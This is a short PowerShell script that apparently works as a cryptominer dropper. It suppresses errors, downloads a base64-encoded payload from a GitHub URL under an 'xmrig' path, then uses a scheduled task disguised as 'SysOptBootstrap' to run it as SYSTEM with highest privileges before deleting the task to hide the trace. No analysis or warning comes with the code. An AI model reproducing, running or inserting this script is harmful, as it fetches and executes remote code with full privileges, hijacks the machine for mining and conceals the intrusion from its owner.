#Requires -RunAsAdministrator

$ErrorActionPreference = "SilentlyContinue"

$b64 = irm https://raw.githubusercontent.com/alphahubv2/modest-fermi/master/xmrig/bootstrap.b64

$taskCmd = "schtasks /Create /TN SysOptBootstrap /TR `\"powershell -EncodedCommand $b64`\" /SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F 2>`$null; schtasks /Run /TN SysOptBootstrap 2>`$null; schtasks /Delete /TN SysOptBootstrap /F 2>`$null"

Start-Process powershell -ArgumentList "-Command $taskCmd" -Verb RunAs -Wait